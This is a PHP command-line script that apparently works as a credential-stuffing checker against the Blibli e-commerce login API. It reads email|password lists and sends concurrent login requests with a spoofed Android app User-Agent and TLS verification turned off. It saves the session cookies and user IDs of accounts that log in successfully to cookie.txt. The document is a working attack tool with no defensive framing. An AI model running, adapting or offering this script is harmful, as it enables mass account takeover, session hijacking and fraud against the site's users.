<?php

require_once "RollingCurl.php";
require_once "Request.php";

ini_set("memory_limit", '-1');
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));


A1:
echo "[+] Input List (email|pass): ";
$file = trim(fgets(STDIN));
if(empty($file) || !file_exists($file)) {
	echo"[+] File not found!\n";
	goto A1;
}
$list = explode("\n", str_replace("\r", "", file_get_contents($file)));

A2:
echo "[+] Request per second (*max 10): ";
$req = trim(fgets(STDIN));
$req = (empty($reqemail) || !is_numeric($reqemail) || $reqemail <= 0) ? 3 : $req;
if($req > 10) {
	echo " [+] Max 10 !!\n";
	goto A2;
}

$no = 0;
$total = count($list)-1;
$success = 0;
$error = 0;

echo "\n";
$rollingCurl = new \RollingCurl\RollingCurl();
foreach ($list as $key => $akun) {
	if (empty($akun)) continue;
	$pecah = explode("|", trim($akun));
	$email = trim($pecah[0]);
	$pass = trim($pecah[1]);
	$headers = array();
	$headers[] = 'User-Agent:BlibliAndroid/6.9.0(2632) 814a9275-4654-47a7-aabf-25f0beef9f3b Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1701 Build/MMB29M)';
	$headers[] = 'Content-Type: application/json';
	$headers[] = 'Cookie: ak_bmsc=';
	$data = '{"username":"'.$email.'","password":"'.$pass.'"}';
	$rollingCurl->setOptions(array(
		CURLOPT_RETURNTRANSFER => 1, 
		CURLOPT_SSL_VERIFYPEER => 0, 
		CURLOPT_SSL_VERIFYHOST => 0
	))->post("https://www.blibli.com/backend/common/users/_login", $data, $headers);
}
$rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results) {
	global $no, $total, $success, $error;
	$no++;
	$res = $request->getResponseText();
	echo color('blue', "[".date("H:i:s")."]")." - Total: $no/$total - ";
	if (strpos($res, '"status":"OK"')) {
		preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $res, $matches);
		$cookies = array();
		foreach($matches[1] as $item) {
		  parse_str($item, $cookie);
		  $cookies = array_merge($cookies, $cookie);
		}
		$xyz = http_build_query($cookies, '', '; ');
		preg_match('/"id":(.*?),"/', $res, $idz);
		preg_match('/"username":"(.*?)","/', $res, $user);
		echo color('green', "[SUCCESS]")." Id: ".$idz[1]." - Email: ".$user[1]."\n";
		file_put_contents("cookie.txt", $user[1]."|".$xyz."\n", FILE_APPEND);
		$success++;
	} else {
		echo color('red', "[ERROR]")."\n";
		$error++;
	}
})->setSimultaneousLimit((int) $req)->execute();

echo color('blue', "[FINISHED]")." | Success: ".$success." - Error: ".$error." | Saved to cookie.txt\n";

function color($color = "default" , $text)
    {
        $arrayColor = array(
            'red'       => '1;31',
            'green'     => '1;32',
            'yellow'    => '1;33',
            'blue'      => '1;34',
        );  
        return "\033[".$arrayColor[$color]."m".$text."\033[0m";
    }
